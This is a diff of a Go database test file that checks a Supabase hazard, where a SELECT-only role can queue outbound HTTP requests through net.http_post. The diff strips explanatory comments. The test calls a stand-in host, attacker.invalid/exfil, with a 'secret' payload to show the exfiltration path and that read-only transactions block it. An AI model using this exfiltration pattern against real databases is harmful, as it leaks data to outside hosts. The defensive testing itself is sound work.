@@ -24,7 +24,6 @@ func wantSQLState(t *testing.T, err error, code string) {
 	}
 }
 
-// inTx runs fn inside a transaction that is always rolled back.
 func inTx(t *testing.T, conn *pgx.Conn, opts pgx.TxOptions, fn func(pgx.Tx)) {
 	t.Helper()
 	tx, err := conn.BeginTx(t.Context(), opts)
@@ -91,19 +90,16 @@ func TestSupabaseHazardExists(t *testing.T) {
 		}
 	}
 
-	// A role granted only SELECT queues an HTTP request...
 	inTx(t, conn, pgx.TxOptions{}, func(tx pgx.Tx) {
 		if _, err := tx.Exec(t.Context(), "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')"); err != nil {
 			t.Fatalf("net.http_post: %v", err)
 		}
-		// DELETE without WHERE needs no SELECT privilege and reports what is queued.
 		tag, err := tx.Exec(t.Context(), "DELETE FROM net.http_request_queue")
 		if err != nil || tag.RowsAffected() != 1 {
 			t.Errorf("queued requests: tag=%v err=%v, want one", tag, err)
 		}
 	})
 
-	// ...unless the transaction is read-only.
 	inTx(t, conn, pgx.TxOptions{AccessMode: pgx.ReadOnly}, func(tx pgx.Tx) {
 		_, err := tx.Exec(t.Context(), "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')")
 		wantSQLState(t, err, sqlStateReadOnlyTransaction)
